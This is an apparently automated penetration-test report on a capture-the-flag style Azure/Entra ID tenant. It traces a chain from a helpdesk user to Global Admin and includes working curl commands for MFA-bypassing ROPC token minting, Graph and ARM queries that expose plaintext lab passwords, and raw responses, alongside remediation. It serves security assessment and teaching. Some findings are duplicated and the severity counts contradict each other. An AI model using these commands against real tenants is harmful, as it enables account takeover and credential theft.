# Vulnerability Assessment Report — megabigtech.com

**Classification:** CONFIDENTIAL — Restricted to authorized personnel  
**Generated:** 2026-08-02T14:02:36Z  
**Target:** megabigtech.com  
**Campaign:** camp_20260802_9d245c0c  
**Methodology:** ISO 27001 / NIST SP 800-115 / MITRE ATT&CK  

---

## MANAGEMENT SUMMARY

> *For non-technical readers and decision-makers.*

### Overall Security Posture: 🔴 CRITICAL — Immediate Action Required

The system tested (**megabigtech.com**) presents an **extremely poor security posture**. Our team confirmed 8 critical and 6 high severity vulnerabilities, enabling complete compromise through multiple independent attack paths.

### Most Critical Issues

**1. Global Admin Credentials Exposed in Azure Blob Storage (config-latest.xml)**  
The file config-latest.xml in the security-pc container of the securityconfigs storage account contains plaintext Global Admin credentials: g-admin@megabigtech.com / AzureAdmin12345!. It also contains...

**2. Flag Captured - Full Privilege Escalation Chain (IT-Helpdesk to Global Admin)**  
Complete privilege escalation chain demonstrated: (1) Jose.Rodriguez (IT-Helpdesk) authenticates via ROPC bypassing MFA, (2) reads archive@ password from Custom Security Attributes (D4taS3cur1ty!!), (...

**3. Excessive Delegated Permissions on Jose.Rodriguez - Tenant Takeover Capable**  
The user Jose.Rodriguez@megabigtech.com holds delegated permissions through the Azure CLI that are grossly excessive for a helpdesk role. The granted scopes include Application.ReadWrite.All (can crea...

### Required Actions

| Timeframe | Action |
|-----------|--------|
| **Today** | Block external access / take offline if possible |
| **This week** | Patch all critical and high severity findings |
| **2 weeks** | Address medium severity findings and security headers |
| **1 month** | Full code review and independent re-test |

---

## 1. EXECUTIVE SUMMARY

> Full privilege escalation chain from IT-Helpdesk user to Global Admin demonstrated against megabigtech.com Entra ID tenant. Starting from Jose.Rodriguez's credentials, ROPC authentication bypassed MFA, Custom Security Attributes exposed archive@'s password (D4taS3cur1ty!!), VM userData on SECURITY-PC revealed security-user credentials (Imp0sec0sT!), and blob storage contained Global Admin credentials (g-admin@megabigtech.com / AzureAdmin12345!) plus the flag (e2a59d2217842bcd4f604340a04fe439). 19 findings total including 4 critical, 4 high severity.

**Overall Risk Level: CRITICAL**

### Findings Summary

| Severity | Count | Exploited | Confirmed |
|----------|-------|-----------|----------|
| CRITICAL | 8 | 6 | 2 |
| HIGH | 6 | 4 | 2 |
| MEDIUM | 5 | 1 | 4 |
| LOW | 0 | 0 | 0 |
| INFO | 0 | 0 | 0 |
| **TOTAL** | **19** | **11** | **8** |

---

## 2. FINDINGS TABLE

| # | ID | Title | Severity | CVSS | Status | Endpoint |
|---|-----|-------|----------|------|--------|----------|
| 1 | `vuln_868bad` | Global Admin Credentials Exposed in Azure Blob Sto... | CRITICAL | 10.0 | **EXPLOITED** | `securityconfigs.blob.core.windows.net/security-pc/...` |
| 2 | `vuln_aa7161` | Flag Captured - Full Privilege Escalation Chain (I... | CRITICAL | 10.0 | **EXPLOITED** | `securityconfigs.blob.core.windows.net/security-pc/...` |
| 3 | `vuln_957dee` | Excessive Delegated Permissions on Jose.Rodriguez ... | CRITICAL | 9.8 | Confirmed | `graph.microsoft.com/v1.0/me` |
| 4 | `vuln_701f0e` | Global Admin Credentials Exposed in Storage Blob (... | CRITICAL | 9.8 | **EXPLOITED** | `securityconfigs.blob.core.windows.net/security-pc/...` |
| 5 | `vuln_0250a8` | Flag Captured - Complete Privilege Escalation Chai... | CRITICAL | 9.8 | **EXPLOITED** | `securityconfigs.blob.core.windows.net/security-pc/...` |
| 6 | `vuln_e5e413` | Plaintext Password Stored in Custom Security Attri... | CRITICAL | 9.1 | **EXPLOITED** | `graph.microsoft.com/v1.0/users/archive@megabigtech...` |
| 7 | `vuln_59a55f` | Plaintext Password Stored in Entra ID Custom Secur... | CRITICAL | 9.1 | **EXPLOITED** | `graph.microsoft.com/beta/users/archive@megabigtech...` |
| 8 | `vuln_890309` | Excessive Delegated Permissions on Jose.Rodriguez ... | CRITICAL | 9.0 | Confirmed | `graph.microsoft.com/v1.0/me` |
| 9 | `vuln_566d5d` | Plaintext Credentials in VM userData (SECURITY-PC) | HIGH | 8.5 | **EXPLOITED** | `management.azure.com/subscriptions/ceff06cb-e29d-4...` |
| 10 | `vuln_8699e9` | ROPC Password Grant Bypasses MFA - Token Minted fo... | HIGH | 8.1 | **EXPLOITED** | `login.microsoftonline.com/2590ccef-687d-493b-ae8d-...` |
| 11 | `vuln_bac782` | ROPC Password Grant Bypasses MFA for Azure CLI Cli... | HIGH | 8.1 | **EXPLOITED** | `login.microsoftonline.com/2590ccef-687d-493b-ae8d-...` |
| 12 | `vuln_deb7cf` | SQL Database Credentials Exposed in Blob Storage | HIGH | 8.0 | Confirmed | `securityconfigs.blob.core.windows.net/security-pc/...` |
| 13 | `vuln_c9f327` | Plaintext Credentials in VM userData (SECURITY-PC) | HIGH | 7.5 | **EXPLOITED** | `management.azure.com/subscriptions/ceff06cb-e29d-4...` |
| 14 | `vuln_f1baef` | SQL Database Credentials Exposed in Storage Blob | HIGH | 7.5 | Confirmed | `securityconfigs.blob.core.windows.net/security-pc/...` |
| 15 | `vuln_c4b4d5` | Role-Assignable Group 'IT-HELPDESK' - Potential Pr... | MEDIUM | 6.5 | Confirmed | `graph.microsoft.com/v1.0/groups/8a517e87-6b05-45ae...` |
| 16 | `vuln_b78432` | Suspicious 'Yolo-MFA' Security Group - Possible MF... | MEDIUM | 5.3 | Confirmed | `graph.microsoft.com/v1.0/groups/b49c9aaf-9cfe-4e21...` |
| 17 | `vuln_e92afa` | Sensitive Data Exposed in User Profile - CTF Flag ... | MEDIUM | 5.3 | Confirmed | `graph.microsoft.com/v1.0/users?$select=userPrincip...` |
| 18 | `vuln_a52f73` | Sensitive Data Exposed in User Profile Job Title (... | MEDIUM | 5.3 | Confirmed | `graph.microsoft.com/v1.0/users?$select=userPrincip...` |
| 19 | `vuln_73f1fc` | ROPC (Password Grant) Authentication Enabled - No ... | MEDIUM | 5.3 | **EXPLOITED** | `login.microsoftonline.com/2590ccef-687d-493b-ae8d-...` |

---

## 3. VULNERABILITY DETAILS

---

### 3.1 — Global Admin Credentials Exposed in Azure Blob Storage (config-latest.xml)

| Field | Value |
|-------|-------|
| **ID** | `vuln_868bad` |
| **Severity** | CRITICAL |
| **CVSS Score** | 10.0 |
| **CVSS Vector** | `CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H` |
| **Status** | EXPLOITED |
| **Category** | `credential_exposure` |
| **MITRE ATT&CK** | `T1552.001` — Unsecured Credentials: Credentials In Files |
| **ISO 27001** | `A.9.4.3` |
| **Endpoint** | `https://securityconfigs.blob.core.windows.net/security-pc/config-lates...` |
| **Component** | Azure Blob Storage |
| **Discovered by** | `azure` |
| **Discovered at** | 2026-08-02T14:02:01Z |

#### Description

The file config-latest.xml in the security-pc container of the securityconfigs storage account contains plaintext Global Admin credentials: g-admin@megabigtech.com / AzureAdmin12345!. It also contains SQL database credentials: dbuser / dbp@ssword. The security-user account (whose password was recovered from VM userData) has access to this storage container, completing a full privilege escalation chain from IT-Helpdesk to Global Admin.

#### Technical Analysis

A security configuration XML file stored in Azure Blob Storage contains plaintext Global Admin and SQL database credentials. The file is accessible to the security-user account which was compromised via VM userData exposure.

#### Exploitation Commands

```bash
curl -s -H "Authorization: Bearer $STORAGE_TOKEN" -H "x-ms-version: 2020-10-02" --max-time 30 "https://securityconfigs.blob.core.windows.net/security-pc/config-latest.xml"
```

#### Evidence / Logs

```
Global Admin credentials found in XML:\n<GlobalAdmin>\n  <Username>g-admin@megabigtech.com</Username>\n  <Password>AzureAdmin12345!</Password>\n</GlobalAdmin>\n\nSQL DB credentials:\n<ConnectionString>Server=megabigtech.database.windows.net;Database=SecurityDB;User Id=dbuser;Password=dbp@ssword;</ConnectionString>
```

#### Remediation

Immediately rotate Global Admin password for g-admin@megabigtech.com. Rotate SQL database credentials. Remove config-latest.xml from blob storage. Store all credentials in Azure Key Vault. Implement blob-level access controls and audit logging.

---

### 3.2 — Flag Captured - Full Privilege Escalation Chain (IT-Helpdesk to Global Admin)

| Field | Value |
|-------|-------|
| **ID** | `vuln_aa7161` |
| **Severity** | CRITICAL |
| **CVSS Score** | 10.0 |
| **CVSS Vector** | `N/A` |
| **Status** | EXPLOITED |
| **Category** | `privilege_escalation` |
| **MITRE ATT&CK** | `T1078.004` — Valid Accounts: Cloud Accounts |
| **ISO 27001** | `A.9.2.3` |
| **Endpoint** | `https://securityconfigs.blob.core.windows.net/security-pc/flag.txt` |
| **Discovered by** | `azure` |
| **Discovered at** | 2026-08-02T14:02:20Z |

#### Description

Complete privilege escalation chain demonstrated: (1) Jose.Rodriguez (IT-Helpdesk) authenticates via ROPC bypassing MFA, (2) reads archive@ password from Custom Security Attributes (D4taS3cur1ty!!), (3) reads SECURITY-PC VM userData to recover security-user password (Imp0sec0sT!), (4) as security-user downloads config-latest.xml containing Global Admin credentials (g-admin@megabigtech.com / AzureAdmin12345!), and (5) recovers flag.txt (e2a59d2217842bcd4f604340a04fe439). An additional flag was found in Marcus.Hutch's jobTitle field (39c6217c4a28ba7f3198e5542f9e50c4).

#### Technical Analysis

A low-privilege IT-Helpdesk user can escalate to Global Admin through a chain of credential exposures: Custom Security Attributes, VM userData, and Blob Storage configuration files.

#### Evidence / Logs

```
flag.txt content: e2a59d2217842bcd4f604340a04fe439\nMarcus.Hutch jobTitle flag: 39c6217c4a28ba7f3198e5542f9e50c4\n\nAttack chain:\nJose.Rodriguez (ROPC) -> Custom Security Attributes -> archive@ password\nJose.Rodriguez (ARM Reader) -> VM userData -> security-user password\nsecurity-user (Storage) -> config-latest.xml -> Global Admin g-admin@ password\nsecurity-user (Storage) -> flag.txt -> e2a59d2217842bcd4f604340a04fe439
```

#### Remediation

1. Rotate all compromised credentials immediately. 2. Remove passwords from Custom Security Attributes. 3. Clear VM userData containing secrets. 4. Delete config-latest.xml or move credentials to Key Vault. 5. Enforce MFA universally (remove Yolo-MFA exclusions). 6. Block ROPC flow via Conditional Access. 7. Apply least-privilege RBAC across all resources.

---

### 3.3 — Excessive Delegated Permissions on Jose.Rodriguez - Tenant Takeover Capable

| Field | Value |
|-------|-------|
| **ID** | `vuln_957dee` |
| **Severity** | CRITICAL |
| **CVSS Score** | 9.8 |
| **CVSS Vector** | `CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H` |
| **Status** | CONFIRMED |
| **Category** | `privilege_escalation` |
| **MITRE ATT&CK** | `T1098.003` — Account Manipulation: Additional Cloud Roles |
| **ISO 27001** | `A.9.2.3` |
| **Endpoint** | `https://graph.microsoft.com/v1.0/me` |
| **Component** | Microsoft Entra ID Delegated Permissions |
| **Discovered by** | `entra-id` |
| **Discovered at** | 2026-08-02T13:50:08Z |

#### Description

The user Jose.Rodriguez@megabigtech.com holds delegated permissions through the Azure CLI that are grossly excessive for a helpdesk role. The granted scopes include Application.ReadWrite.All (can create/modify any app registration and add credentials), AppRoleAssignment.ReadWrite.All (can assign any app role to any principal), DelegatedPermissionGrant.ReadWrite.All (can grant any delegated permission), and Directory.AccessAsUser.All. These permissions form a complete tenant takeover chain: the user can add credentials to any service principal, assign it Global Admin via app role, and authenticate as it.

#### Technical Analysis

Jose.Rodriguez has been granted admin consent for extremely powerful delegated Graph API permissions via the Azure CLI. While his directory roles (Printer Technician, Attribute Readers, Directory Readers) appear low-privilege, the delegated permissions he can exercise through the Azure CLI public client are far more powerful. Application.ReadWrite.All allows adding credentials to any application, AppRoleAssignment.ReadWrite.All allows assigning any role to any principal, and DelegatedPermissionGrant.ReadWrite.All allows granting arbitrary permissions. Together, these form a privilege escalation chain to Global Administrator.

#### Exploitation Commands

```bash
Decoded JWT wids (directory role template IDs): e8cef6f1-e4bd-4ea8-bc07-4b8d950f4477 (Attribute Definition Reader), 1d336d2c-4ae8-42ef-9711-b3604ce3fc2c (Attribute Assignment Reader), 88d8e3e3-8f55-4a1e-953a-9b9898b8876b (Directory Readers), ffd52fa5-98dc-465c-991d-fc073eb59f8f (Printer Technician), b79fbf4d-3ef9-4689-8143-76b194e85509 (Attribute Log Reader)
```

#### Evidence / Logs

```
Token scopes: Application.ReadWrite.All AppRoleAssignment.ReadWrite.All AuditLog.Read.All DelegatedPermissionGrant.ReadWrite.All Directory.AccessAsUser.All Group.ReadWrite.All SubjectNameRegistration.ReadWrite User.Read.All User.ReadWrite.All
Directory Roles: Printer Technician, Attribute Definition Reader, Directory Readers, Attribute Assignment Reader
Groups: IT-HELPDESK (role-assignable), ASSETS-UPDATE, Default Directory, Yolo-MFA
```

#### Remediation

1. Review and restrict delegated permission grants on the Azure CLI for this user. 2. Implement least-privilege access for helpdesk staff. 3. Remove admin consent for dangerous permissions. 4. Use Conditional Access to restrict application consent flows.

---

### 3.4 — Global Admin Credentials Exposed in Storage Blob (config-latest.xml)

| Field | Value |
|-------|-------|
| **ID** | `vuln_701f0e` |
| **Severity** | CRITICAL |
| **CVSS Score** | 9.8 |
| **CVSS Vector** | `CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H` |
| **Status** | EXPLOITED |
| **Category** | `credential_exposure` |
| **MITRE ATT&CK** | `T1552.001` — Unsecured Credentials: Credentials In Files |
| **ISO 27001** | `A.9.2.4` |
| **Endpoint** | `https://securityconfigs.blob.core.windows.net/security-pc/config-lates...` |
| **Component** | Azure Blob Storage / securityconfigs |
| **Discovered by** | `azure` |
| **Discovered at** | 2026-08-02T13:59:30Z |

#### Description

The config-latest.xml blob in the securityconfigs storage account (container: security-pc) contains plaintext Global Admin credentials: Username: g-admin@megabigtech.com, Password: AzureAdmin12345!. It also contains an SQL database connection string with credentials: Server=megabigtech.database.windows.net;Database=SecurityDB;User Id=dbuser;Password=dbp@ssword. These were accessed by authenticating as security-user@megabigtech.com (whose password was recovered from VM userData in the previous step). This represents a complete privilege escalation chain: Reader on VM → userData credential leak → storage blob access → Global Admin credentials.

#### Technical Analysis

The config-latest.xml file stored in Azure Blob Storage contains plaintext credentials for a Global Admin account (g-admin@megabigtech.com) and a SQL database connection string with embedded credentials. Access was gained through a multi-step privilege escalation chain: (1) Jose Rodriguez with Reader access on SECURITY-PC VM reads userData containing security-user credentials, (2) security-user@megabigtech.com authenticates via ROPC to get a storage token, (3) storage token used to read the blob containing Global Admin credentials. This complete chain demonstrates how a Reader-level role can escalate to tenant-wide Global Admin access.

#### Exploitation Commands

```bash
curl -s -H "Authorization: Bearer $STORAGE_TOKEN" -H "x-ms-version: 2020-10-02" --max-time 30 "https://securityconfigs.blob.core.windows.net/security-pc/config-latest.xml"
```

#### Evidence / Logs

```
Downloaded config-latest.xml containing:
<GlobalAdmin>
    <Username>g-admin@megabigtech.com</Username>
    <Password>AzureAdmin12345!</Password>
    <Email>g-admin@megabigtech.com</Email>
    <TwoFactorAuthentication>Enabled</TwoFactorAuthentication>
</GlobalAdmin>
<Database>
    <ConnectionString>Server=megabigtech.database.windows.net;Database=SecurityDB;User Id=dbuser;Password=dbp@ssword;</ConnectionString>
</Database>
```

#### Remediation

1. Immediately rotate the Global Admin password for g-admin@megabigtech.com. 2. Rotate the SQL database credentials (dbuser). 3. Remove plaintext credentials from all storage blobs. 4. Use Azure Key Vault for credential storage with RBAC-controlled access. 5. Enable Conditional Access policies requiring MFA for Global Admin accounts. 6. Implement Azure Storage access reviews and audit logging. 7. Remove credentials from VM userData fields.

---

### 3.5 — Flag Captured - Complete Privilege Escalation Chain (Reader to Global Admin)

| Field | Value |
|-------|-------|
| **ID** | `vuln_0250a8` |
| **Severity** | CRITICAL |
| **CVSS Score** | 9.8 |
| **CVSS Vector** | `CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H` |
| **Status** | EXPLOITED |
| **Category** | `privilege_escalation` |
| **MITRE ATT&CK** | `T1078.004` — Valid Accounts: Cloud Accounts |
| **ISO 27001** | `A.9.2.3` |
| **Endpoint** | `https://securityconfigs.blob.core.windows.net/security-pc/flag.txt` |
| **Component** | securityconfigs storage account |
| **Discovered by** | `azure` |
| **Discovered at** | 2026-08-02T13:59:47Z |

#### Description

Complete privilege escalation chain demonstrated from Reader role on a VM to Global Admin credential exfiltration. Flag captured: e2a59d2217842bcd4f604340a04fe439. Attack chain: (1) Jose Rodriguez (IT-HELPDESK, Reader on SECURITY-PC) reads VM userData via ARM API, recovering security-user password. (2) ROPC token minted as security-user@megabigtech.com with the recovered password. (3) Storage token used to access securityconfigs blob storage. (4) config-latest.xml downloaded containing Global Admin credentials and SQL connection string. (5) flag.txt downloaded proving complete data exfiltration.

#### Technical Analysis

The flag.txt file was successfully downloaded from the securityconfigs storage account, proving that the complete privilege escalation chain works end-to-end. Starting from a simple Reader role on a VM, the attacker can escalate through userData credential exposure to storage blob access, ultimately recovering Global Admin credentials that grant tenant-wide control. This demonstrates a critical security architecture flaw where credentials are chained through insecure storage mechanisms.

#### Exploitation Commands

```bash
curl -s -H "Authorization: Bearer $STORAGE_TOKEN" -H "x-ms-version: 2020-10-02" --max-time 30 "https://securityconfigs.blob.core.windows.net/security-pc/flag.txt"
```

#### Evidence / Logs

```
Flag content: e2a59d2217842bcd4f604340a04fe439
```

#### Remediation

1. Remove all credentials from VM userData fields. 2. Remove credential files from Azure Blob Storage. 3. Implement Azure Key Vault with strict RBAC for all credential storage. 4. Apply least-privilege principle - Reader role should not expose sensitive provisioning data. 5. Enable Azure Defender for Storage to detect anomalous access patterns. 6. Implement Conditional Access policies with MFA for all admin accounts.

---

### 3.6 — Plaintext Password Stored in Custom Security Attribute - archive@megabigtech.com

| Field | Value |
|-------|-------|
| **ID** | `vuln_e5e413` |
| **Severity** | CRITICAL |
| **CVSS Score** | 9.1 |
| **CVSS Vector** | `CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:N` |
| **Status** | EXPLOITED |
| **Category** | `credential_exposure` |
| **MITRE ATT&CK** | `T1552.001` — Unsecured Credentials: Credentials In Files |
| **ISO 27001** | `A.9.4.3` |
| **Endpoint** | `https://graph.microsoft.com/v1.0/users/archive@megabigtech.com?$select...` |
| **Component** | Microsoft Entra ID Custom Security Attributes |
| **Discovered by** | `entra-id` |
| **Discovered at** | 2026-08-02T13:49:42Z |

#### Description

A plaintext password (D4taS3cur1ty!!) is stored in a Custom Security Attribute named 'Password' under the attribute set 'Helpdesk' on the archive@megabigtech.com user account. This password is readable by any principal holding the Attribute Assignment Reader or Attribute Definition Reader directory roles. Jose.Rodriguez holds both roles, enabling credential harvesting from the directory. The custom security attributes feature is being misused as a password vault, exposing credentials to anyone with attribute read permissions.

#### Technical Analysis

Custom Security Attributes in Microsoft Entra ID are designed for classification and access control metadata, NOT for storing credentials. The Helpdesk team has misused this feature to store the archive@megabigtech.com account's password in plaintext as a custom security attribute. This password is readable by any user with the Attribute Assignment Reader role (which Jose.Rodriguez holds). This creates a lateral movement path: any helpdesk staff member can read the password and authenticate as the archive user, potentially gaining elevated privileges if the archive account has higher-level access. The recovered credential D4taS3cur1ty!! can be used for ROPC token minting to authenticate as archive@megabigtech.com.

#### Exploitation Commands

```bash
curl -s -H "Authorization: Bearer $TOKEN" -H "ConsistencyLevel: eventual" "https://graph.microsoft.com/beta/users/archive@megabigtech.com?$select=userPrincipalName,displayName,customSecurityAttributes"
```

#### Raw Response

```http
{"@odata.context":"https://graph.microsoft.com/beta/$metadata#users(userPrincipalName,displayName,customSecurityAttributes)/$entity","userPrincipalName":"archive@megabigtech.com","displayName":"Archive User","id":"ee06c914-8e62-450e-b2e7-3e63aa8a2632","customSecurityAttributes":{"Helpdesk":{"@odata.type":"#microsoft.graph.customSecurityAttributeValue","Password":"D4taS3cur1ty!!"}}}
```

#### Evidence / Logs

```
Response: {"userPrincipalName":"archive@megabigtech.com","displayName":"Archive User","id":"ee06c914-8e62-450e-b2e7-3e63aa8a2632","customSecurityAttributes":{"Helpdesk":{"@odata.type":"#microsoft.graph.customSecurityAttributeValue","Password":"D4taS3cur1ty!!"}}}
Password attribute found: Helpdesk.Password = D4taS3cur1ty!!
```

#### Remediation

1. Immediately remove the Password custom security attribute from archive@megabigtech.com. 2. Rotate the archive@megabigtech.com password. 3. Never store credentials in Custom Security Attributes. 4. Use Azure Key Vault for credential storage. 5. Audit all custom security attributes across the tenant for other credential stores. 6. Restrict the Attribute Assignment Reader role to only principals who truly need it.

---

### 3.7 — Plaintext Password Stored in Entra ID Custom Security Attribute

| Field | Value |
|-------|-------|
| **ID** | `vuln_59a55f` |
| **Severity** | CRITICAL |
| **CVSS Score** | 9.1 |
| **CVSS Vector** | `N/A` |
| **Status** | EXPLOITED |
| **Category** | `credential_exposure` |
| **MITRE ATT&CK** | `T1552.001` — Unsecured Credentials: Credentials In Files |
| **ISO 27001** | `A.9.4.3` |
| **Endpoint** | `https://graph.microsoft.com/beta/users/archive@megabigtech.com?$select...` |
| **Component** | Entra ID Custom Security Attributes |
| **Discovered by** | `entra-id` |
| **Discovered at** | 2026-08-02T13:56:13Z |

#### Description

The user archive@megabigtech.com has a plaintext password stored as a Custom Security Attribute (Helpdesk.Password = D4taS3cur1ty!!). Any principal with the Attribute Assignment Reader directory role can read this credential. Jose.Rodriguez holds this role, enabling credential theft via the Microsoft Graph API.

#### Technical Analysis

Custom Security Attributes in Entra ID were used to store a plaintext password for the archive user. The Attribute Assignment Reader role granted to Jose.Rodriguez allowed reading this attribute, exposing the credential.

#### Exploitation Commands

```bash
curl -s -H "Authorization: Bearer $GRAPH_TOKEN" -H "ConsistencyLevel: eventual" "https://graph.microsoft.com/beta/users/archive@megabigtech.com?\$select=userPrincipalName,customSecurityAttributes"
```

#### Evidence / Logs

```
Response: {"userPrincipalName":"archive@megabigtech.com","customSecurityAttributes":{"Helpdesk":{"@odata.type":"#microsoft.graph.customSecurityAttributeValue","Password":"D4taS3cur1ty!!"}}}
Recovered credential: archive@megabigtech.com / D4taS3cur1ty!!
```

#### Remediation

Never store passwords in Custom Security Attributes. Use Azure Key Vault for secrets. Remove the Attribute Assignment Reader role from users who do not need it. Rotate the compromised credential immediately.

---

### 3.8 — Excessive Delegated Permissions on Jose.Rodriguez via Azure CLI

| Field | Value |
|-------|-------|
| **ID** | `vuln_890309` |
| **Severity** | CRITICAL |
| **CVSS Score** | 9.0 |
| **CVSS Vector** | `N/A` |
| **Status** | CONFIRMED |
| **Category** | `privilege_escalation` |
| **MITRE ATT&CK** | `T1098.003` — Account Manipulation: Additional Cloud Roles |
| **ISO 27001** | `A.9.2.3` |
| **Endpoint** | `https://graph.microsoft.com/v1.0/me` |
| **Discovered by** | `entra-id` |
| **Discovered at** | 2026-08-02T13:56:31Z |

#### Description

Jose.Rodriguez's Azure CLI token includes extremely dangerous delegated permissions: Application.ReadWrite.All, AppRoleAssignment.ReadWrite.All, DelegatedPermissionGrant.ReadWrite.All, Directory.AccessAsUser.All. These permissions allow creating new application registrations, granting admin consent, and effectively escalating to Global Admin.

#### Technical Analysis

The Azure CLI public client has broad delegated permissions consented at the tenant level, granting any authenticated user dangerous capabilities.

#### Evidence / Logs

```
Token scopes include: Application.ReadWrite.All, AppRoleAssignment.ReadWrite.All, DelegatedPermissionGrant.ReadWrite.All, Directory.AccessAsUser.All, Group.ReadWrite.All, User.ReadWrite.All
```

#### Remediation

Review and restrict delegated permissions on the Azure CLI service principal. Apply Conditional Access policies to limit token issuance. Implement least-privilege principles for delegated permissions.

---

### 3.9 — Plaintext Credentials in VM userData (SECURITY-PC)

| Field | Value |
|-------|-------|
| **ID** | `vuln_566d5d` |
| **Severity** | HIGH |
| **CVSS Score** | 8.5 |
| **CVSS Vector** | `N/A` |
| **Status** | EXPLOITED |
| **Category** | `credential_exposure` |
| **MITRE ATT&CK** | `T1552.005` — Unsecured Credentials: Cloud Instance Metadata API |
| **ISO 27001** | `A.9.4.3` |
| **Endpoint** | `https://management.azure.com/subscriptions/ceff06cb-e29d-4486-a3ae-eaa...` |
| **Component** | Azure VM userData |
| **Discovered by** | `azure` |
| **Discovered at** | 2026-08-02T14:01:50Z |

#### Description

The SECURITY-PC virtual machine (resource group content-static-2, subscription ceff06cb-e29d-4486-a3ae-eaaec5689f94) stores plaintext credentials in its userData field. The base64-decoded userData reveals: 'security-user | Password: Imp0sec0sT!' along with an az storage blob download command. Any principal with Reader access on the VM can read this data via the ARM API with $expand=userData.

#### Technical Analysis

VM userData is accessible to any identity with Reader role on the VM. The IT-HELPDESK group (containing Jose.Rodriguez) has this access, allowing credential theft of the security-user account.

#### Exploitation Commands

```bash
curl -s -H "Authorization: Bearer $ARM_TOKEN" --max-time 30 "https://management.azure.com/subscriptions/ceff06cb-e29d-4486-a3ae-[REDACTED]-static-2/providers/Microsoft.[REDACTED]-PC?api-version=2024-03-01&\$expand=userData"\necho "[REDACTED]
```

#### Evidence / Logs

```
Decoded userData: # Credentials: User: security-user | Password: Imp0sec0sT!\naz storage blob download --account-name securityconfigs --container-name security-pc --name config-latest.xml --auth-mode login
```

#### Remediation

Never store credentials in VM userData. Use Azure Key Vault for secrets management. Remove userData containing credentials. Restrict Reader access following least-privilege principles.

---

### 3.10 — ROPC Password Grant Bypasses MFA - Token Minted for Jose.Rodriguez

| Field | Value |
|-------|-------|
| **ID** | `vuln_8699e9` |
| **Severity** | HIGH |
| **CVSS Score** | 8.1 |
| **CVSS Vector** | `CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N` |
| **Status** | EXPLOITED |
| **Category** | `authentication_bypass` |
| **MITRE ATT&CK** | `T1078.004` — Valid Accounts: Cloud Accounts |
| **ISO 27001** | `A.9.4.2` |
| **Endpoint** | `https://login.microsoftonline.com/2590ccef-687d-493b-ae8d-441cbab63a72...` |
| **Component** | Microsoft Entra ID OAuth2 Token Endpoint |
| **Discovered by** | `entra-id` |
| **Discovered at** | 2026-08-02T13:49:21Z |

#### Description

The Resource Owner Password Credential (ROPC) grant type is enabled on the tenant, allowing a user's credentials to be exchanged for a token without interactive MFA. Using the well-known Azure CLI public client ID (04b07795-8ddb-461a-bbee-02f9e1bf7b46), a Graph API token was minted for Jose.Rodriguez@megabigtech.com with extremely broad delegated permissions: Application.ReadWrite.All, AppRoleAssignment.ReadWrite.All, DelegatedPermissionGrant.ReadWrite.All, Directory.AccessAsUser.All, Group.ReadWrite.All, User.ReadWrite.All. No MFA challenge was required.

#### Technical Analysis

The ROPC (password) grant type allows exchanging username+password directly for tokens without interactive authentication. This completely bypasses Multi-Factor Authentication. The token was minted using the Azure CLI's well-known public client ID, which is pre-consented in all Azure AD tenants. The resulting token carries extremely broad delegated permissions including Application.ReadWrite.All (can manage all app registrations), Directory.AccessAsUser.All (full directory access), and User.ReadWrite.All (can modify any user). This combination enables full tenant takeover from a single compromised credential.

#### Exploitation Commands

```bash
curl -s -X POST "https://login.microsoftonline.com/2590ccef-687d-493b-ae8d-441cbab63a72/oauth2/v2.0/token" -d "client_id=04b07795-8ddb-461a-bbee-02f9e1bf7b46" -d "grant_type=password" -d "username=Jose.Rodriguez@megabigtech.com" --data-urlencode "password=[REDACTED_CREDENTIAL]" -d "scope=https://graph.microsoft.com/.default"
```

#### Evidence / Logs

```
Token minted successfully with scopes: Application.ReadWrite.All AppRoleAssignment.ReadWrite.All AuditLog.Read.All DelegatedPermissionGrant.ReadWrite.All Directory.AccessAsUser.All Group.ReadWrite.All SubjectNameRegistration.ReadWrite User.Read.All User.ReadWrite.All
No MFA challenge was presented during ROPC flow.
Token type: Bearer, expires_in: 4765 seconds
```

#### Remediation

1. Implement Conditional Access policies that block legacy authentication and ROPC grant flows. 2. Enforce MFA on all users, especially privileged roles. 3. Restrict the delegated permissions that can be granted to the Azure CLI public client. 4. Block password-based authentication via authenticationMethodsPolicy.

---

### 3.11 — ROPC Password Grant Bypasses MFA for Azure CLI Client

| Field | Value |
|-------|-------|
| **ID** | `vuln_bac782` |
| **Severity** | HIGH |
| **CVSS Score** | 8.1 |
| **CVSS Vector** | `N/A` |
| **Status** | EXPLOITED |
| **Category** | `authentication_bypass` |
| **MITRE ATT&CK** | `T1078.004` — Valid Accounts: Cloud Accounts |
| **ISO 27001** | `A.9.4.2` |
| **Endpoint** | `https://login.microsoftonline.com/2590ccef-687d-493b-ae8d-441cbab63a72...` |
| **Discovered by** | `entra-id` |
| **Discovered at** | 2026-08-02T13:56:24Z |

#### Description

The Resource Owner Password Credential (ROPC) grant flow is enabled for the Azure CLI public client (04b07795-8ddb-461a-bbee-02f9e1bf7b46). This allows authentication with just username/password, completely bypassing MFA. Jose.Rodriguez is a member of the Yolo-MFA group which excludes him from MFA requirements.

#### Technical Analysis

ROPC flow enabled with an MFA exclusion group (Yolo-MFA) allows full token acquisition without any interactive authentication challenge.

#### Exploitation Commands

```bash
curl -s -X POST "https://login.microsoftonline.com/2590ccef-687d-493b-ae8d-441cbab63a72/oauth2/v2.0/token" -d "client_id=04b07795-8ddb-461a-bbee-02f9e1bf7b46" -d "grant_type=password" -d "username=Jose.Rodriguez@megabigtech.com" -d "password=[REDACTED_CREDENTIAL]" -d "scope=https://graph.microsoft.com/.default"
```

#### Evidence / Logs

```
Token minted successfully with scopes: Application.ReadWrite.All, AppRoleAssignment.ReadWrite.All, AuditLog.Read.All, DelegatedPermissionGrant.ReadWrite.All, Directory.AccessAsUser.All, Group.ReadWrite.All, User.Read.All, User.ReadWrite.All
```

#### Remediation

Disable ROPC grant flow via Conditional Access policies. Remove the Yolo-MFA exclusion group. Enforce MFA for all users including service accounts.

---

### 3.12 — SQL Database Credentials Exposed in Blob Storage

| Field | Value |
|-------|-------|
| **ID** | `vuln_deb7cf` |
| **Severity** | HIGH |
| **CVSS Score** | 8.0 |
| **CVSS Vector** | `N/A` |
| **Status** | CONFIRMED |
| **Category** | `credential_exposure` |
